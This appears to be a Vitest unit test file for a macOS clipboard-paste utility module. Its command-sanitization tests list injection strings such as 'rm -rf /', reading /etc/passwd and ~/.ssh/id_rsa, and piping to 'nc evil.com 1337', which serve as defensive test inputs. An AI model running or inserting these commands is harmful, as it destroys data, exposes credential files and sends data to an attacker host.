type ExecCallback = (error: Error | null, stdout: string, stderr: string) => void;

// Mock child_process before importing utils
vi.mock('child_process', () => ({
    exec: vi.fn(),
    execFile: vi.fn()
}));

// Mock fs before importing utils
vi.mock('fs', () => ({
    promises: {
        access: vi.fn(),
        mkdir: vi.fn(),
        appendFile: vi.fn(() => Promise.resolve())
    }
}));

import {
    logger,
    getCurrentApp,
    pasteWithNativeTool,
    debounce,
    safeJsonParse,
    safeJsonStringify,
    generateId,
    ensureDir,
    fileExists,
    sleep,
    getActiveWindowBounds,
    sanitizeCommandArgument,
    isCommandArgumentSafe,
    activateAndPasteWithNativeTool,
    isValidHexColor,
    validateColorValue
} from '../../src/utils/utils';

import { execFile } from 'child_process';
import { promises as fs } from 'fs';

const mockedExecFile = vi.mocked(execFile);
// Keep mockedExec as an alias for backward compatibility
const mockedExec = mockedExecFile;
const mockedFs = vi.mocked(fs);

// Use global captureConsole() from tests/setup.ts

describe('Utils', () => {
    beforeEach(() => {
        vi.clearAllMocks();
    });

    describe('Logger', () => {
        let consoleSpy: ReturnType<typeof captureConsole>;

        beforeEach(() => {
            consoleSpy = captureConsole();
        });

        afterEach(() => {
            consoleSpy.restore();
        });

        test('should log messages with correct format', () => {
            logger.info('Test message', { data: 'test' });
            
            const logs = consoleSpy.getLogs();
            expect(logs.length).toBeGreaterThan(0);
        });

        test('should log error messages', () => {
            logger.error('Error message');
            
            const logs = consoleSpy.getLogs();
            expect(logs.length).toBeGreaterThan(0);
        });
    });

    describe('getCurrentApp', () => {
        test('should return null on non-macOS platforms', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'linux' });
            
            const result = await getCurrentApp();
            expect(result).toBeNull();
            
            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });

        test('should handle exec errors gracefully', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {
                callback(new Error('Command failed'), '', '');
                return null as any;
            });

            const result = await getCurrentApp();
            expect(result).toBeNull();

            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });

        test('should return app info on success', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {
                callback(null, '{"name":"TestApp","bundleId":"com.test.app"}', '');
                return null as any;
            });

            const result = await getCurrentApp();
            expect(result).toEqual({ name: 'TestApp', bundleId: 'com.test.app' });

            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });

        test('should handle app without bundle ID', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {
                callback(null, '{"name":"TestApp","bundleId":null}', '');
                return null as any;
            });

            const result = await getCurrentApp();
            expect(result).toEqual({ name: 'TestApp', bundleId: null });

            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });

        test('should handle native tool errors', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {
                callback(null, '{"error":"No active application found"}', '');
                return null as any;
            });

            const result = await getCurrentApp();
            expect(result).toBeNull();

            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });
    });

    describe('pasteWithNativeTool', () => {
        test('should execute paste command on macOS', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {
                callback(null, '{"success":true,"command":"paste"}', '');
                return null as any;
            });

            await expect(pasteWithNativeTool()).resolves.toBeUndefined();

            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });

        test('should handle native tool failure', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {
                callback(null, '{"success":false,"command":"paste"}', '');
                return null as any;
            });

            await expect(pasteWithNativeTool()).rejects.toThrow('Native paste failed');

            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });

        test('should handle exec errors', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {
                callback(new Error('Command failed'), '', '');
                return null as any;
            });

            await expect(pasteWithNativeTool()).rejects.toThrow('Command failed');

            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });

        test('should throw error on non-macOS platforms', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'linux' });

            await expect(pasteWithNativeTool()).rejects.toThrow('Native paste only supported on macOS');

            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });
    });

    describe('debounce', () => {
        beforeEach(() => {
            vi.useFakeTimers();
        });

        afterEach(() => {
            vi.clearAllTimers();
            vi.useRealTimers();
        });

        test('should delay function execution', () => {
            const fn = vi.fn();
            const debouncedFn = debounce(fn, 100);
            
            debouncedFn();
            expect(fn).not.toHaveBeenCalled();
            
            vi.advanceTimersByTime(100);
            expect(fn).toHaveBeenCalledTimes(1);
        });

        test('should cancel previous calls', () => {
            const fn = vi.fn();
            const debouncedFn = debounce(fn, 100);
            
            debouncedFn();
            debouncedFn();
            debouncedFn();
            
            vi.advanceTimersByTime(100);
            expect(fn).toHaveBeenCalledTimes(1);
        });

        afterEach(() => {
            vi.clearAllTimers();
        });
    });


    describe('safeJsonParse', () => {
        test('should parse valid JSON', () => {
            const result = safeJsonParse('{"test": "value"}', {});
            expect(result).toEqual({ test: 'value' });
        });

        test('should return fallback for invalid JSON', () => {
            const fallback = { default: true };
            const result = safeJsonParse('invalid json', fallback);
            expect(result).toEqual(fallback);
        });
    });

    describe('safeJsonStringify', () => {
        test('should stringify objects', () => {
            const result = safeJsonStringify({ test: 'value' });
            expect(result).toBe('{\n  "test": "value"\n}');
        });

        test('should handle circular references', () => {
            const obj: any = { test: 'value' };
            obj.self = obj;
            
            // Suppress console.warn for this test
            const originalWarn = console.warn;
            console.warn = vi.fn();
            
            const result = safeJsonStringify(obj);
            expect(result).toBe('{}'); // Returns fallback value for circular references
            
            // Restore console.warn
            console.warn = originalWarn;
        });
    });

    describe('generateId', () => {
        test('should generate unique IDs', () => {
            const id1 = generateId();
            const id2 = generateId();
            
            expect(id1).toBeDefined();
            expect(id2).toBeDefined();
            expect(id1).not.toBe(id2);
        });

        test('should generate IDs with correct length', () => {
            const id = generateId();
            expect(id.length).toBeGreaterThan(0);
        });
    });


    describe('ensureDir', () => {
        test('should resolve when directory exists', async () => {
            mockedFs.access.mockResolvedValue();
            
            await expect(ensureDir('/test/path')).resolves.toBeUndefined();
            expect(mockedFs.access).toHaveBeenCalledWith('/test/path');
        });

        test('should create directory when it does not exist', async () => {
            mockedFs.access.mockRejectedValue({ code: 'ENOENT' } as any);
            mockedFs.mkdir.mockResolvedValue(undefined);
            
            await expect(ensureDir('/test/path')).resolves.toBeUndefined();
            expect(mockedFs.mkdir).toHaveBeenCalledWith('/test/path', { recursive: true, mode: 0o700 });
        });

        test('should throw error for access issues other than ENOENT', async () => {
            mockedFs.access.mockRejectedValue(new Error('Permission denied'));
            
            await expect(ensureDir('/test/path')).rejects.toThrow('Permission denied');
        });
    });

    describe('fileExists', () => {
        test('should return true when file exists', async () => {
            mockedFs.access.mockResolvedValue();
            
            const result = await fileExists('/test/file.txt');
            expect(result).toBe(true);
        });

        test('should return false when file does not exist', async () => {
            mockedFs.access.mockRejectedValue({ code: 'ENOENT' } as any);
            
            const result = await fileExists('/test/file.txt');
            expect(result).toBe(false);
        });
    });

    describe('sleep', () => {
        beforeEach(() => {
            vi.useFakeTimers();
        });

        afterEach(() => {
            vi.clearAllTimers();
            vi.useRealTimers();
        });

        test('should delay execution', async () => {
            const promise = sleep(1000);

            vi.advanceTimersByTime(1000);

            await expect(promise).resolves.toBeUndefined();
        });
    });

    describe('getActiveWindowBounds', () => {
        
        test('should return null on non-macOS platforms', async () => {
            const originalPlatform = process.platform;
            Object.defineProperty(process, 'platform', { value: 'win32' });
            
            const result = await getActiveWindowBounds();
            expect(result).toBeNull();
            
            Object.defineProperty(process, 'platform', { value: originalPlatform });
        });

        test('should handle successful native tool output', async () => {
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            // Mock execFile to return valid window bounds
            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback?: any) => {
                if (typeof callback === 'function') {
                    callback(null, '{"x":100,"y":200,"width":800,"height":600,"appName":"TestApp","bundleId":"com.test.app"}', '');
                }
            });

            const result = await getActiveWindowBounds();
            expect(result).toEqual({
                x: 100,
                y: 200,
                width: 800,
                height: 600
            });
        });

        test('should handle native tool error output', async () => {
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback?: any) => {
                if (typeof callback === 'function') {
                    callback(null, '{"error":"No active window found"}', '');
                }
            });

            const result = await getActiveWindowBounds();
            expect(result).toBeNull();
        });

        test('should handle invalid JSON output', async () => {
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback?: any) => {
                if (typeof callback === 'function') {
                    callback(null, 'invalid json', '');
                }
            });

            const result = await getActiveWindowBounds();
            expect(result).toBeNull();
        });

        test('should handle exec errors', async () => {
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback?: any) => {
                if (typeof callback === 'function') {
                    callback(new Error('Command failed'), '', '');
                }
            });

            const result = await getActiveWindowBounds();
            expect(result).toBeNull();
        });

        test('should handle invalid numeric values', async () => {
            Object.defineProperty(process, 'platform', { value: 'darwin' });

            (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback?: any) => {
                if (typeof callback === 'function') {
                    callback(null, '{"x":"abc","y":"def","width":"ghi","height":"jkl"}', '');
                }
            });

            const result = await getActiveWindowBounds();
            expect(result).toBeNull();
        });
    });

    describe('Command Sanitization Security', () => {
        describe('sanitizeCommandArgument', () => {
            test('should remove dangerous shell metacharacters', () => {
                const dangerous = 'app;rm -rf /;echo safe';
                const sanitized = sanitizeCommandArgument(dangerous);
                
                expect(sanitized).toBe('apprm -rf /echo safe');
                expect(sanitized).not.toContain(';');
                expect(sanitized).not.toContain('|');
                expect(sanitized).not.toContain('`');
                expect(sanitized).not.toContain('$');
            });

            test('should remove command injection attempts', () => {
                const injections = [
                    'app`whoami`',
                    'app$(id)',
                    'app;cat /etc/passwd',
                    'app|nc evil.com 1337',
                    'app&&rm -rf /',
                    'app<script>alert(1)</script>',
                    'app"$(malicious)"',
                    "app'$(evil)'",
                    'app\\$(bypass)',
                    'app*.*',
                    'app?.*',
                    'app~/.ssh/id_rsa'
                ];

                injections.forEach(injection => {
                    const sanitized = sanitizeCommandArgument(injection);
                    expect(sanitized).not.toContain(';');
                    expect(sanitized).not.toContain('|');
                    expect(sanitized).not.toContain('`');
                    expect(sanitized).not.toContain('$');
                    expect(sanitized).not.toContain('(');
                    expect(sanitized).not.toContain(')');
                    expect(sanitized).not.toContain('<');
                    expect(sanitized).not.toContain('>');
                    expect(sanitized).not.toContain('"');
                    expect(sanitized).not.toContain("'");
                    expect(sanitized).not.toContain('\\');
                    expect(sanitized).not.toContain('*');
                    expect(sanitized).not.toContain('?');
                    expect(sanitized).not.toContain('~');
                    expect(sanitized).not.toContain('^');
                });
            });

            test('should preserve safe characters', () => {
                const safeInput = 'MyApp 1.2.3 com.example.app-name_test';
                const sanitized = sanitizeCommandArgument(safeInput);
                
                expect(sanitized).toBe(safeInput);
            });

            test('should remove null bytes and newlines', () => {
                const dangerous = 'app\x00name\r\nmalicious';
                const sanitized = sanitizeCommandArgument(dangerous);
                
                expect(sanitized).toBe('appnamemalicious');
                expect(sanitized).not.toContain('\x00');
                expect(sanitized).not.toContain('\r');
                expect(sanitized).not.toContain('\n');
            });

            test('should truncate long inputs', () => {
                const longInput = 'a'.repeat(300);
                const sanitized = sanitizeCommandArgument(longInput, 100);
                
                expect(sanitized).toHaveLength(100);
            });

            test('should trim whitespace', () => {
                const input = '  MyApp  ';
                const sanitized = sanitizeCommandArgument(input);
                
                expect(sanitized).toBe('MyApp');
            });

            test('should throw error for non-string input', () => {
                expect(() => sanitizeCommandArgument(null as any)).toThrow('Input must be a string');
                expect(() => sanitizeCommandArgument(123 as any)).toThrow('Input must be a string');
                expect(() => sanitizeCommandArgument(undefined as any)).toThrow('Input must be a string');
            });
        });

        describe('isCommandArgumentSafe', () => {
            test('should return false for dangerous characters', () => {
                const dangerousInputs = [
                    'app;malicious',
                    'app|evil',
                    'app`command`',
                    'app$(command)',
                    'app{expansion}',
                    'app[glob]',
                    'app<redirect',
                    'app>redirect',
                    'app"quoted',
                    "app'quoted",
                    'app\\escaped',
                    'app*glob',
                    'app?glob',
                    'app~home',
                    'app^caret',
                    'app\x00null',
                    'app\nnewline',
                    'app\rcarriage',
                    '-flag-starting-input',
                    'app../traversal'
                ];

                dangerousInputs.forEach(input => {
                    expect(isCommandArgumentSafe(input)).toBe(false);
                });
            });

            test('should return true for safe inputs', () => {
                const safeInputs = [
                    'MyApp',
                    'com.example.app',
                    'App Name 1.2.3',
                    'app_name',
                    'app-name',
                    'App.Name',
                    'Simple App',
                    'App123'
                ];

                safeInputs.forEach(input => {
                    expect(isCommandArgumentSafe(input)).toBe(true);
                });
            });

            test('should return false for non-string input', () => {
                expect(isCommandArgumentSafe(null as any)).toBe(false);
                expect(isCommandArgumentSafe(123 as any)).toBe(false);
                expect(isCommandArgumentSafe(undefined as any)).toBe(false);
            });
        });

        describe('activateAndPasteWithNativeTool security', () => {
            test('should reject dangerous app names', async () => {
                const originalPlatform = process.platform;
                Object.defineProperty(process, 'platform', { value: 'darwin' });

                // Mock exec to never be called due to validation rejection
                (mockedExec as any).mockImplementation(() => {
                    throw new Error('Should not reach exec call');
                });

                const dangerousAppName = 'App;rm -rf /';

                await expect(
                    activateAndPasteWithNativeTool(dangerousAppName)
                ).rejects.toThrow('App name contains unsafe characters');

                Object.defineProperty(process, 'platform', { value: originalPlatform });
            });

            test('should reject dangerous bundle IDs', async () => {
                const originalPlatform = process.platform;
                Object.defineProperty(process, 'platform', { value: 'darwin' });

                // Mock exec to never be called due to validation rejection
                (mockedExec as any).mockImplementation(() => {
                    throw new Error('Should not reach exec call');
                });

                const dangerousAppInfo = {
                    name: 'SafeApp',
                    bundleId: 'com.example.app;malicious'
                };

                await expect(
                    activateAndPasteWithNativeTool(dangerousAppInfo)
                ).rejects.toThrow('Bundle ID contains unsafe characters');

                Object.defineProperty(process, 'platform', { value: originalPlatform });
            });

            test('should reject empty app name after sanitization', async () => {
                const originalPlatform = process.platform;
                Object.defineProperty(process, 'platform', { value: 'darwin' });

                const emptyAfterSanitization = ';|`$(){}[]<>"\'\\*?~^';

                await expect(
                    activateAndPasteWithNativeTool(emptyAfterSanitization)
                ).rejects.toThrow('App name contains unsafe characters');

                Object.defineProperty(process, 'platform', { value: originalPlatform });
            });

            test('should accept safe app info', async () => {
                const originalPlatform = process.platform;
                Object.defineProperty(process, 'platform', { value: 'darwin' });

                // Mock execFile to simulate successful execution
                (mockedExec as any).mockImplementation((_file: string, _args: string[], _options: any, callback: ExecCallback) => {
                    callback(null, '{"success":true,"command":"activate-and-paste-name"}', '');
                    return null as any;
                });

                const safeAppInfo = {
                    name: 'MyApp',
                    bundleId: 'com.example.app'
                };

                await expect(
                    activateAndPasteWithNativeTool(safeAppInfo)
                ).resolves.toBeUndefined();

                // Verify that execFile was called with the correct arguments
                // Bundle ID is provided, so it should use activate-and-paste-bundle command
                expect(mockedExec).toHaveBeenCalledWith(
                    expect.any(String), // file path
                    expect.arrayContaining(['activate-and-paste-bundle']), // args array
                    expect.any(Object), // options
                    expect.any(Function) // callback
                );

                Object.defineProperty(process, 'platform', { value: originalPlatform });
            });
        });
    });

    describe('Color Validation', () => {
        describe('isValidHexColor', () => {
            test('should return true for valid 6-digit hex colors', () => {
                const validColors = [
                    '#000000',
                    '#FFFFFF',
                    '#ff0000',
                    '#0066CC',
                    '#ABC123',
                    '#abcdef',
                    '#123456'
                ];

                validColors.forEach(color => {
                    expect(isValidHexColor(color)).toBe(true);
                });
            });

            test('should return true for valid 3-digit hex colors', () => {
                const validColors = [
                    '#000',
                    '#FFF',
                    '#f00',
                    '#0AC',
                    '#abc',
                    '#123'
                ];

                validColors.forEach(color => {
                    expect(isValidHexColor(color)).toBe(true);
                });
            });

            test('should return false for invalid hex colors', () => {
                const invalidColors = [
                    '#GGGGGG',  // Invalid characters
                    '#12345',   // 5 digits
                    '#1234567', // 7 digits
                    '000000',   // Missing #
                    '#',        // Only hash
                    '#12',      // 2 digits
                    'blue',     // Named color
                    '',         // Empty string
                    '#XYZ',     // Invalid characters in 3-digit
                    '#12G'      // Invalid character in 3-digit
                ];

                invalidColors.forEach(color => {
                    expect(isValidHexColor(color)).toBe(false);
                });
            });
        });

        describe('validateColorValue', () => {
            let consoleSpy: ReturnType<typeof captureConsole>;

            beforeEach(() => {
                consoleSpy = captureConsole();
            });

            afterEach(() => {
                consoleSpy.restore();
            });

            test('should accept valid named colors', () => {
                const namedColors = [
                    'grey', 'darkGrey', 'blue', 'purple',
                    'teal', 'green', 'yellow', 'orange',
                    'pink', 'red'
                ];

                namedColors.forEach(color => {
                    expect(validateColorValue(color)).toBe(color);
                });
            });

            test('should accept valid hex color codes', () => {
                const hexColors = [
                    '#000000',
                    '#FFFFFF',
                    '#0066CC',
                    '#FF5722',
                    '#abc',
                    '#F5A'
                ];

                hexColors.forEach(color => {
                    expect(validateColorValue(color)).toBe(color);
                });
            });

            test('should return default color for invalid values', () => {
                const invalidColors = [
                    'invalid-color',
                    '#GGGGGG',
                    '#12345',
                    'notacolor',
                    ''
                ];

                invalidColors.forEach(color => {
                    const result = validateColorValue(color);
                    expect(result).toBe('grey');
                });
            });

            test('should return custom default color', () => {
                const result = validateColorValue('invalid', 'blue');
                expect(result).toBe('blue');
            });

            test('should return default for undefined input', () => {
                expect(validateColorValue(undefined)).toBe('grey');
                expect(validateColorValue(undefined, 'orange')).toBe('orange');
            });

            test('should log warning for invalid colors', () => {
                validateColorValue('invalid-color');

                const logs = consoleSpy.getLogs();
                const warningLogs = logs.filter(log => log[0] === 'warn');
                expect(warningLogs.length).toBeGreaterThan(0);
            });

            test('should not log warning for valid colors', () => {
                validateColorValue('blue');
                validateColorValue('#0066CC');

                const logs = consoleSpy.getLogs();
                const warningLogs = logs.filter(log => log[0] === 'warn');
                expect(warningLogs).toHaveLength(0);
            });
        });
    });
});